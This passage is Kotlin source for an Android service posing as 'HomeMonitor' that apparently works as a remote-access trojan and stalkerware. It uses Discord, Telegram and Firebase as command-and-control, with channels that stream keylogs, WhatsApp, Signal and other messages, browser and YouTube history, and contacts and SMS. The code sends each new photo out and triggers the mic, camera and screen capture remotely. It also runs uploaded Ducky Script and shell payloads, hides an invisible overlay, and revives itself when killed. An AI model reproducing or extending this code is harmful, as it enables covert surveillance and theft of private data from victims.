                • `!dumpkeylogs` - Force dump all keylogs
            """.trimIndent()

            "19-ai-chatbots-stream" -> """
                🧠 **#19-ai-chatbots-stream Information:**
                • Real-time AI Chatbot prompt & response interaction stream (ChatGPT, Gemini, Copilot).
            """.trimIndent()

            "20-app-usage-telemetry" -> """
                📊 **#20-app-usage-telemetry Command List:**
                • `!appusage` / `!topapps` - View daily app usage duration telemetry (last 24h)
                • `!apps` / `!installedapps` - View full user-installed applications inventory
                • `!dumpapps` - Force dump app usage telemetry & installed app inventory
            """.trimIndent()

            "21-browser-history" -> """
                🌐 **#21-browser-history Command List & Information:**
                • Real-time browser URL navigation, address bar text, and search query stream.
                • `!history` / `!browserhistory` - View recent browser navigation & search history log entries.
                • `!dumpbrowser` / `!dumphistory` - Force dump browser navigation & search history
            """.trimIndent()

            "22-whatsapp-stream" -> """
                💬 **#22-whatsapp-stream Information:**
                • Live WhatsApp & WhatsApp Business message stream (incoming received & outgoing sent messages).
            """.trimIndent()

            "23-telegram-stream" -> """
                💬 **#23-telegram-stream Information:**
                • Live Telegram message stream (incoming received & outgoing sent messages).
            """.trimIndent()

            "24-messenger-stream" -> """
                💬 **#24-messenger-stream Information:**
                • Live Facebook Messenger stream (incoming received & outgoing sent messages).
            """.trimIndent()

            "25-instagram-stream" -> """
                💬 **#25-instagram-stream Information:**
                • Live Instagram Direct message stream (incoming received & outgoing sent messages).
            """.trimIndent()

            "26-signal-stream" -> """
                💬 **#26-signal-stream Information:**
                • Live Signal Private Messenger stream (incoming received & outgoing sent messages).
            """.trimIndent()

            "27-other-chats-stream" -> """
                💬 **#27-other-chats-stream Information:**
                • Live messaging stream for Snapchat, Viber, Line, WeChat, Zalo, Skype, Discord, etc.
            """.trimIndent()

            "28-youtube-history" -> """
                ▶️ **#28-youtube-history Command List & Information:**
                • Real-time YouTube watched video titles, creator channel names, video links, and YouTube searches.
                • `!youtube` / `!youtubehistory` - View recent YouTube watch history log entries.
                • `!dumpyoutube` / `!dumpyt` - Force dump YouTube watch history
            """.trimIndent()

            "29-ducky-script-payloads" -> """
                🦆 **#29-ducky-script-payloads Rubber Ducky Command Directory:**
                • Upload any `.ducky` or `.txt` Ducky Script payload file here to auto-execute on phone
                • Or type Ducky Script code directly in channel:
                  `STRING Hello World`
                  `DELAY 500`
                  `GUI r`
                  `STRINGLN https://example.com`
                  `APP_OPEN Chrome`
                  `TAP 0.5 0.5`
                  `SWIPE 0.5 0.8 0.5 0.2 300`
                  `UNLOCK`
                  `STEALTH ON` / `STEALTH OFF`
                  `SHELL <cmd>`
            """.trimIndent()

            else -> ""
        }

        if (helpMsg.isNotBlank()) {
            sendDiscordRawMessage(channelId, helpMsg)
        } else {
            sendHelpMenu(channelId)
        }
    }

    private fun pollDiscordChannelMessages(channelId: String) {
        try {
            val url = "https://discord.com/api/v10/channels/$channelId/messages?limit=5"
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                .get()
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val array = JSONArray(response.body?.string() ?: "[]")
                    if (array.length() > 0) {
                        val latestMsg = array.getJSONObject(0)
                        val msgId = latestMsg.getString("id")
                        val author = latestMsg.optJSONObject("author")
                        val isBot = author?.optBoolean("bot") ?: false
                        val content = latestMsg.optString("content")

                        val lastMsgId = processedChannelMsgIds[channelId] ?: ""

                        if (!isBot && msgId != lastMsgId) {
                            processedChannelMsgIds[channelId] = msgId

                            // 1. Process File Drop Auto-Save for #15-file-drop-and-share
                            val attachments = latestMsg.optJSONArray("attachments")
                            val fileDropChanId = getOrCreateDiscordChannelId("15-file-drop-and-share")
                            if (!fileDropChanId.isNullOrBlank() && channelId == fileDropChanId && attachments != null && attachments.length() > 0) {
                                for (attIdx in 0 until attachments.length()) {
                                    val att = attachments.getJSONObject(attIdx)
                                    val attUrl = att.optString("url")
                                    val attFileName = att.optString("filename")
                                    if (attUrl.isNotBlank() && attFileName.isNotBlank()) {
                                        downloadDiscordAttachmentToStorage(channelId, attUrl, attFileName)
                                    }
                                }
                            }

                            val trimmed = content.trim()
                            if (trimmed == "!list" || trimmed == "!help" || trimmed == "list" || trimmed == "help") {
                                sendChannelSpecificHelpMenu(channelId)
                                return
                            }

                            // 2. Process Ducky Script Payloads for #29-ducky-script-payloads
                            val duckyChanId = getOrCreateDiscordChannelId("29-ducky-script-payloads")
                            if (!duckyChanId.isNullOrBlank() && channelId == duckyChanId) {
                                var payloadExecuted = false
                                if (attachments != null && attachments.length() > 0) {
                                    for (attIdx in 0 until attachments.length()) {
                                        val att = attachments.getJSONObject(attIdx)
                                        val attUrl = att.optString("url")
                                        val attFileName = att.optString("filename")
                                        if (attUrl.isNotBlank()) {
                                            executeDuckyScriptAttachment(channelId, attUrl, attFileName)
                                            payloadExecuted = true
                                        }
                                    }
                                }
                                if (!payloadExecuted && content.isNotBlank()) {
                                    DuckyScriptEngine.executePayloadAsync(applicationContext, content, channelId) { progressMsg ->
                                        sendDiscordRawMessage(channelId, progressMsg)
                                    }
                                }
                                return
                            }

                            if (content.isNotBlank()) {
                                Log.i(TAG, "Discord REST Poll received NEW command in channel $channelId: '$content'")

                                val termuxChanId = getOrCreateDiscordChannelId("16-termux-shell")
                                if (!termuxChanId.isNullOrBlank() && channelId == termuxChanId) {
                                    val termuxCmd = if (content.startsWith("!") || content.startsWith("/")) {
                                        "/termux " + content.substring(1).trim()
                                    } else {
                                        "/termux $content"
                                    }
                                    dispatchCommand(termuxCmd, channelId, isDirectServerCommand = true)
                                } else {
                                    handleDiscordCommand(channelId, content)
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "pollDiscordChannelMessages error: ${e.message}")
        }
    }

    private fun downloadDiscordAttachmentToStorage(channelId: String, downloadUrl: String, fileName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                if (!downloadDir.exists()) downloadDir.mkdirs()

                val targetFile = File(downloadDir, fileName)
                val req = Request.Builder().url(downloadUrl).get().build()

                httpClient.newCall(req).execute().use { res ->
                    if (res.isSuccessful && res.body != null) {
                        FileOutputStream(targetFile).use { out ->
                            res.body!!.byteStream().copyTo(out)
                        }
                        val sizeLabel = when {
                            targetFile.length() >= 1_048_576 -> "${"%.1f".format(targetFile.length() / 1_048_576.0)} MB"
                            targetFile.length() >= 1_024 -> "${"%.1f".format(targetFile.length() / 1_024.0)} KB"
                            else -> "${targetFile.length()} B"
                        }
                        Log.i(TAG, "Successfully downloaded Discord attachment '${targetFile.name}' to ${targetFile.absolutePath}")
                        sendDiscordRawMessage(channelId, "📥 **File Auto-Saved to Primary Storage**\n• **File**: `${targetFile.name}`\n• **Size**: `$sizeLabel`\n• **Path**: `${targetFile.absolutePath}`")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "downloadDiscordAttachmentToStorage error: ${e.message}")
            }
        }
    }

    private fun executeDuckyScriptAttachment(channelId: String, downloadUrl: String, fileName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val req = Request.Builder().url(downloadUrl).get().build()
                httpClient.newCall(req).execute().use { res ->
                    if (res.isSuccessful && res.body != null) {
                        val fileContent = res.body!!.string()
                        if (fileContent.isNotBlank()) {
                            sendDiscordRawMessage(channelId, "📥 **Downloaded Ducky Script Payload File**: `$fileName`")
                            DuckyScriptEngine.executePayloadAsync(applicationContext, fileContent, channelId) { progressMsg ->
                                sendDiscordRawMessage(channelId, progressMsg)
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "executeDuckyScriptAttachment error: ${e.message}")
            }
        }
    }

    private fun dumpHistoricalSmsAndContactsOnStartup() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val smsChanId = getOrCreateDiscordChannelId("06-sms-and-contacts") ?: return@launch

                val contactsList = readContacts()
                if (contactsList.isNotEmpty()) {
                    val sb = StringBuilder("💬 **Historical Address Book Contacts (${contactsList.size} Total)**\n\n")
                    for (c in contactsList) {
                        sb.append("👤 **${c.first}**: `${c.second}`\n")
                        if (sb.length > 1800) {
                            sendDiscordRawMessage(smsChanId, sb.toString())
                            sb.clear()
                        }
                    }
                    if (sb.isNotEmpty()) sendDiscordRawMessage(smsChanId, sb.toString())
                }

                handleSms(smsChanId, "")
            } catch (e: Exception) {
                Log.e(TAG, "dumpHistoricalSmsAndContactsOnStartup error: ${e.message}")
            }
        }
    }

    private fun dumpHistoricalCallLogsOnStartup() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val callChanId = getOrCreateDiscordChannelId("09-call-logs-and-recs") ?: return@launch
                handleCallLogs(callChanId)
            } catch (e: Exception) {
                Log.e(TAG, "dumpHistoricalCallLogsOnStartup error: ${e.message}")
            }
        }
    }

    @Volatile private var discordWebSocket: WebSocket? = null

    private fun startDiscordGateway() {
        if (DISCORD_BOT_TOKEN.isBlank()) return
        ensureDiscordChannelMatrix()
        serviceScope.launch(Dispatchers.IO) {
            try {
                val request = Request.Builder().url("wss://gateway.discord.gg/?v=10&encoding=json").build()
                discordWebSocket = httpClient.newWebSocket(request, object : WebSocketListener() {
                    override fun onOpen(webSocket: WebSocket, response: Response) {
                        Log.i(TAG, "Discord Gateway WebSocket Opened!")
                        val identifyPayload = JSONObject().apply {
                            put("op", 2)
                            put("d", JSONObject().apply {
                                put("token", DISCORD_BOT_TOKEN)
                                put("intents", 32767)
                                put("properties", JSONObject().apply {
                                    put("os", "android")
                                    put("browser", "HomeMonitor")
                                    put("device", Build.MODEL)
                                })
                                put("presence", JSONObject().apply {
                                    put("status", "online")
                                    put("since", 91879201)
                                    put("afk", false)
                                })
                            })
                        }
                        webSocket.send(identifyPayload.toString())
                    }

                    override fun onMessage(webSocket: WebSocket, text: String) {
                        try {
                            val json = JSONObject(text)
                            val op = json.optInt("op")
                            if (op == 10) {
                                val heartbeatInterval = json.getJSONObject("d").getLong("heartbeat_interval")
                                startDiscordHeartbeat(webSocket, heartbeatInterval)
                            } else if (op == 0) {
                                val eventType = json.optString("t")
                                if (eventType == "MESSAGE_CREATE") {
                                    val d = json.getJSONObject("d")
                                    val author = d.optJSONObject("author")
                                    if (author?.optBoolean("bot") == false) {
                                        val content = d.optString("content")
                                        val channelId = d.optString("channel_id")
                                        handleDiscordCommand(channelId, content)
                                    }
                                } else if (eventType == "INTERACTION_CREATE") {
                                    val d = json.getJSONObject("d")
                                    val interactionId = d.optString("id")
                                    val interactionToken = d.optString("token")
                                    val appId = d.optString("application_id", "1567549464229445843")
                                    val channelId = d.optString("channel_id")
                                    val dataObj = d.optJSONObject("data")
                                    val cmdName = dataObj?.optString("name") ?: "help"

                                    if (interactionId.isNotBlank() && interactionToken.isNotBlank()) {
                                        acknowledgeDiscordInteractionDeferred(interactionId, interactionToken)
                                        executeAndPatchDiscordInteraction(appId, interactionToken, channelId, "/$cmdName")
                                    } else {
                                        handleDiscordCommand(channelId, "/$cmdName")
                                    }
                                } else if (eventType == "VOICE_STATE_UPDATE") {
                                    val d = json.getJSONObject("d")
                                    val voiceChannelId = d.optString("channel_id")
                                    val userId = d.optString("user_id")
                                    if (!voiceChannelId.isNullOrBlank() && userId.isNotBlank()) {
                                        handleDiscordVoiceChannelJoin(voiceChannelId)
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                        Log.e(TAG, "Discord Gateway Failure: ${t.message}")
                        delayAndReconnectGateway()
                    }

                    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                        delayAndReconnectGateway()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "startDiscordGateway error: ${e.message}")
            }
        }
    }

    private fun acknowledgeDiscordInteractionDeferred(interactionId: String, interactionToken: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val url = "https://discord.com/api/v10/interactions/$interactionId/$interactionToken/callback"
                val json = JSONObject().put("type", 5) // 5 = DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE
                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).post(body).build()
                httpClient.newCall(request).execute().use { res ->
                    Log.i(TAG, "acknowledgeDiscordInteractionDeferred code: ${res.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "acknowledgeDiscordInteractionDeferred error: ${e.message}")
            }
        }
    }

    private fun executeAndPatchDiscordInteraction(appId: String, interactionToken: String, channelId: String, cmdText: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                dispatchCommand(cmdText, channelId, isDirectServerCommand = true)

                val url = "https://discord.com/api/v10/webhooks/$appId/$interactionToken/messages/@original"
                val json = JSONObject().put("content", "✅ Executed `$cmdText` directive on device `${Build.MODEL}`")
                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder().url(url).patch(body).build()
                httpClient.newCall(request).execute().use { res ->
                    Log.i(TAG, "completeDiscordInteractionOriginal code: ${res.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "executeAndPatchDiscordInteraction error: ${e.message}")
            }
        }
    }

    private fun handleDiscordCommand(channelId: String, content: String) {
        val trimmed = content.trim()
        if (trimmed.isBlank()) return
        Log.i(TAG, "Executing Discord channel $channelId command: '$trimmed'")
        try {
            val cmdText = when {
                trimmed.startsWith("!") -> "/" + trimmed.substring(1).trim()
                trimmed.startsWith("/") -> trimmed
                else -> "/$trimmed"
            }
            dispatchCommand(cmdText, channelId, isDirectServerCommand = true)
        } catch (e: Exception) {
            Log.e(TAG, "handleDiscordCommand error: ${e.message}")
        }
    }

    private fun handleDiscordVoiceChannelJoin(voiceChannelId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val prefs = getSharedPreferences("discord_channels", MODE_PRIVATE)
            val commandsChanId = getOrCreateDiscordChannelId("01-status-and-commands") ?: voiceChannelId
            val audioChanId = getOrCreateDiscordChannelId("06-ambient-audio") ?: voiceChannelId
            val photosChanId = getOrCreateDiscordChannelId("07-photos-and-screenshots") ?: voiceChannelId

            Log.i(TAG, "Voice State Update: User joined Voice Channel ID: $voiceChannelId")

            when (voiceChannelId) {
                prefs.getString("chan_🔊 Live Ambient Mic", null) -> {
                    Log.i(TAG, "User joined 🔊 Live Ambient Mic voice channel — starting live mic audio stream!")
                    sendMessage(commandsChanId, "🔊 **Live Ambient Mic Stream Auto-Triggered**\n🎙️ Recording 30s ambient mic audio…")
                    dispatchCommand("/audio 30", audioChanId, isDirectServerCommand = true)
                }
                prefs.getString("chan_📹 Live Camera + Mic", null) -> {
                    Log.i(TAG, "User joined 📹 Live Camera + Mic video channel — starting rear camera & mic stream!")
                    sendMessage(commandsChanId, "📹 **Live Camera + Mic Stream Auto-Triggered**\n📸 Capturing camera & recording mic audio…")
                    dispatchCommand("/camera", photosChanId, isDirectServerCommand = true)
                    dispatchCommand("/audio 30", audioChanId, isDirectServerCommand = true)
                }
                prefs.getString("chan_📷 Live Camera Muted", null) -> {
                    Log.i(TAG, "User joined 📷 Live Camera Muted video channel — starting rear camera stream!")
                    sendMessage(commandsChanId, "📷 **Live Camera Stream Auto-Triggered**\n📸 Capturing rear camera photo…")
                    dispatchCommand("/camera", photosChanId, isDirectServerCommand = true)
                }
                prefs.getString("chan_📺 Live Screen + Mic", null) -> {
                    Log.i(TAG, "User joined 📺 Live Screen + Mic video channel — starting screen sequence & mic stream!")
                    sendMessage(commandsChanId, "📺 **Live Screen + Mic Stream Auto-Triggered**\n🎬 Capturing screen sequence & recording mic audio…")
                    dispatchCommand("/livescreen 15", photosChanId, isDirectServerCommand = true)
                    dispatchCommand("/audio 30", audioChanId, isDirectServerCommand = true)
                }
                prefs.getString("chan_🖥️ Live Screen Muted", null) -> {
                    Log.i(TAG, "User joined 🖥️ Live Screen Muted video channel — starting screen sequence stream!")
                    sendMessage(commandsChanId, "🖥️ **Live Screen Stream Auto-Triggered**\n🎬 Capturing screen sequence clip…")
                    dispatchCommand("/livescreen 15", photosChanId, isDirectServerCommand = true)
                }
            }
        }
    }

    private fun startDiscordHeartbeat(webSocket: WebSocket, intervalMs: Long) {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(intervalMs)
                try {
                    webSocket.send(JSONObject().put("op", 1).put("d", null).toString())
                } catch (_: Exception) { break }
            }
        }
    }

    private fun delayAndReconnectGateway() {
        serviceScope.launch(Dispatchers.IO) {
            delay(10_000)
            startDiscordGateway()
        }
    }

    private fun startSensorsRealtimeStream() {
        try {
            sensorManager = getSystemService(SENSOR_SERVICE) as? SensorManager
            accelerometer = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
            if (sensorManager != null && accelerometer != null) {
                var lastSensorAlertTime = 0L
                motionSensorEventListener = object : SensorEventListener {
                    override fun onSensorChanged(event: SensorEvent?) {
                        if (event == null) return
                        val x = event.values[0]
                        val y = event.values[1]
                        val z = event.values[2]
                        val gForce = Math.sqrt((x * x + y * y + z * z).toDouble()) / SensorManager.GRAVITY_EARTH
                        if (gForce > 2.2) {
                            val now = System.currentTimeMillis()
                            if (now - lastSensorAlertTime > 15_000L) {
                                lastSensorAlertTime = now
                                sendDiscordStreamSensorAlert("Accelerometer Motion", "🚨 Device Movement / Motion Detected! Force: `${"%.2f".format(gForce)}G`")
                            }
                        }
                    }
                    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
                }
                sensorManager?.registerListener(motionSensorEventListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL)
                Log.i(TAG, "Real-time motion sensor stream registered successfully")
            }
        } catch (e: Exception) {
            Log.e(TAG, "startSensorsRealtimeStream error: ${e.message}")
        }
    }

    private var photosContentObserver: ContentObserver? = null
    @Volatile private var lastProcessedPhotoId: Long = -1L
    @Volatile private var lastProcessedPhotoPath: String? = null
    @Volatile private var lastProcessedPhotoTimestamp: Long = 0L
    private val photoObserverLock = Any()

    private fun registerRecentPhotosObserver() {
        try {
            val handler = Handler(Looper.getMainLooper())
            photosContentObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    serviceScope.launch(Dispatchers.IO) {
                        delay(1500L) // Wait 1.5s for camera app to finish writing image bytes & EXIF
                        synchronized(photoObserverLock) {
                            try {
                                val projection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                    arrayOf(
                                        MediaStore.Images.Media._ID,
                                        MediaStore.Images.Media.DATA,
                                        MediaStore.Images.Media.DATE_ADDED,
                                        MediaStore.Images.Media.IS_PENDING
                                    )
                                } else {
                                    arrayOf(
                                        MediaStore.Images.Media._ID,
                                        MediaStore.Images.Media.DATA,
                                        MediaStore.Images.Media.DATE_ADDED
                                    )
                                }

                                contentResolver.query(
                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                    projection,
                                    null,
                                    null,
                                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                                )?.use { cursor ->
                                    if (cursor.moveToFirst()) {
                                        val photoId = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                                        if (photoId == lastProcessedPhotoId) {
                                            return@synchronized
                                        }

                                        val filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                                        val dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                                        val nowMs = System.currentTimeMillis()

                                        if (nowMs - lastProcessedPhotoTimestamp < 15_000L && (photoId == lastProcessedPhotoId || filePath == lastProcessedPhotoPath)) {
                                            return@synchronized
                                        }

                                        val nowSec = nowMs / 1000L
                                        if (nowSec - dateAdded < 120) {
                                            lastProcessedPhotoId = photoId
                                            lastProcessedPhotoPath = filePath
                                            lastProcessedPhotoTimestamp = nowMs
                                            val photoFile = File(filePath)
                                            if (photoFile.exists() && photoFile.length() > 0) {
                                                Log.i(TAG, "Detected newly clicked camera photo: ${photoFile.name} — forwarding EXACTLY ONCE to #08-photos-dump!")
                                                sendDiscordCategorizedFile("08-photos-dump", photoFile, "image/jpeg")
                                            }
                                        }
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Recent photos observer error: ${e.message}")
                            }
                        }
                    }
                }
            }

            contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                photosContentObserver!!
            )
            Log.i(TAG, "Registered real-time MediaStore ContentObserver for camera photos!")
        } catch (e: Exception) {
            Log.e(TAG, "registerRecentPhotosObserver error: ${e.message}")
        }
    }

    private var invisibleOverlayView: android.view.View? = null

    private fun attachInvisibleOverlayWindow() {
        if (!Settings.canDrawOverlays(this)) return
        mainHandler.post {
            try {
                if (invisibleOverlayView != null) return@post
                val wm = getSystemService(WINDOW_SERVICE) as? android.view.WindowManager ?: return@post

                val params = android.view.WindowManager.LayoutParams(
                    1, 1,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_PHONE,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    android.graphics.PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = android.view.Gravity.TOP or android.view.Gravity.START
                    x = 0
                    y = 0
                    alpha = 0f
                }

                invisibleOverlayView = android.view.View(this).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                }

                wm.addView(invisibleOverlayView, params)
                Log.i(TAG, "Attached 1x1 100% Invisible Overlay Window for 24/7 unrestricted hardware access")
            } catch (e: Exception) {
                Log.w(TAG, "attachInvisibleOverlayWindow error: ${e.message}")
            }
        }
    }

    @Volatile var firebaseC2Engine: FirebaseC2Engine? = null
    @Volatile var firebaseSignalingRepository: FirebaseSignalingRepository? = null
    @Volatile var webRtcEngine: WebRtcEngine? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        activeInstance = this
        Log.i(TAG, "MonitorService started - Firebase C2 & Discord Gateway Mode")

        startForegroundWithNotification()
        acquireWakeLock()
        attachInvisibleOverlayWindow()
        startAccessibilityPersistenceWatchdog()
        registerDiscordSlashCommands()
        startDiscordGateway()
        startDiscordTelegramStylePollingLoop()
        startSensorsRealtimeStream()
        registerRecentPhotosObserver()

        if (firebaseC2Engine == null) {
            val engine = FirebaseC2Engine(this, httpClient, serviceScope) { cmdText, sourceId ->
                dispatchCommand(cmdText, sourceId, isDirectServerCommand = true)
            }
            firebaseC2Engine = engine
            engine.startEngine()

            val signalingRepo = FirebaseSignalingRepository(this, engine)
            val rtcEngine = WebRtcEngine(this, signalingRepo)

            signalingRepo.setCallback(object : FirebaseSignalingRepository.SignalingCallback {
                override fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>) {
                    rtcEngine.startSession(sessionId, isOffer = false)
                }
                override fun onOfferReceived(sdp: String) {
                    rtcEngine.handleRemoteOffer(sdp)
                }
                override fun onAnswerReceived(sdp: String) {
                    rtcEngine.handleRemoteAnswer(sdp)
                }
                override fun onIceCandidateReceived(candidateJson: org.json.JSONObject) {
                    rtcEngine.addRemoteIceCandidate(candidateJson)
                }
                override fun onSessionTerminated(sessionId: String) {
                    rtcEngine.close()
                }
            })

            signalingRepo.startListeningForSessionRequests()
            firebaseSignalingRepository = signalingRepo
            webRtcEngine = rtcEngine
        }

        return START_STICKY
    }

    private fun scheduleServiceResurrection() {
        try {
            val restartIntent = Intent(applicationContext, MonitorService::class.java)
            val pendingIntent = PendingIntent.getService(
                applicationContext,
                1,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + 1_000L,
                    pendingIntent
                )
            } else {
                alarmManager.set(
                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + 1_000L,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "scheduleServiceResurrection error: ${e.message}")
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling self-restart via AlarmManager setExactAndAllowWhileIdle")
        scheduleServiceResurrection()
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed — scheduling self-restart via AlarmManager setExactAndAllowWhileIdle")
        scheduleServiceResurrection()
        try { firebaseSignalingRepository?.stopListening() } catch (_: Exception) {}
        try { webRtcEngine?.close() } catch (_: Exception) {}
        pollJob?.cancel()
        serviceScope.cancel()
        cameraExecutor.shutdown()
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_compass) 
            .setOngoing(true)                                  
            .setContentIntent(pendingIntent)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                var fgsTypes = 0
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        fgsTypes = fgsTypes or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    }
                    if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        fgsTypes = fgsTypes or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    }
                    if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                        androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        fgsTypes = fgsTypes or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                    }
                }
                if (fgsTypes != 0) {
                    startForeground(NOTIFICATION_ID, notification, fgsTypes)
                } else {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } catch (e: Exception) {
                Log.w(TAG, "startForeground with types failed, falling back to default: ${e.message}")
                try {
                    startForeground(NOTIFICATION_ID, notification)
                } catch (ex: Exception) {
                    Log.e(TAG, "startForeground default fallback failed: ${ex.message}")
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onTimeout(startId: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
            super.onTimeout(startId)
            Log.w(TAG, "Foreground service execution timeout reached ($startId). Maintaining background tasks...")
        }
    }

    private fun getLastChatId(): String {
        return getSharedPreferences("device_prefs", MODE_PRIVATE).getString("last_chat_id", CHAT_ID) ?: CHAT_ID
    }

    private fun saveLastChatId(chatId: String) {
        if (chatId.isNotBlank()) {
            getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putString("last_chat_id", chatId).apply()
        }
    }

    private suspend fun pollLoop() {
        Log.i(TAG, "Direct Telegram long-polling loop started")
        while (serviceScope.isActive) {
            try {
                val updates = fetchUpdates()
                updates.forEach { update -> handleUpdate(update) }
                processOfflineQueue()
                cleanExpiredFiles()
            } catch (e: Exception) {
                Log.e(TAG, "Telegram long-polling error: ${e.message}")
            }
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val updates = mutableListOf<JSONObject>()
        try {
            val url = "$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0"
            val request = Request.Builder().url(url).get().build()

            val responseBody = httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return emptyList()
                response.body?.string() ?: return emptyList()
            }

            val trimmedBody = responseBody.trim()
            if (!trimmedBody.startsWith("{")) return emptyList()

            val json = JSONObject(trimmedBody)
            if (!json.optBoolean("ok", false)) return emptyList()

            val result = json.optJSONArray("result") ?: return emptyList()

            for (i in 0 until result.length()) {
                val update = result.optJSONObject(i) ?: continue
                updates.add(update)

                val updateId = update.optLong("update_id", -1L)
                if (updateId >= updateOffset) {
                    updateOffset = updateId + 1
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "fetchUpdates error: ${e.message}")
        }

        return updates
    }

    private fun handleUpdate(update: JSONObject) {
        try {
            val callbackQuery = update.optJSONObject("callback_query")
            if (callbackQuery != null) {
                val callbackData = callbackQuery.optString("data")
                val msgObj = callbackQuery.optJSONObject("message")
                val chatId = msgObj?.optJSONObject("chat")?.optString("id") ?: getLastChatId()
                val threadId = when {
                    msgObj?.has("message_thread_id") == true -> msgObj.optInt("message_thread_id", 0)
                    else -> null
                }.let { if (it != null && it > 0) it else null }

                saveLastChatId(chatId)

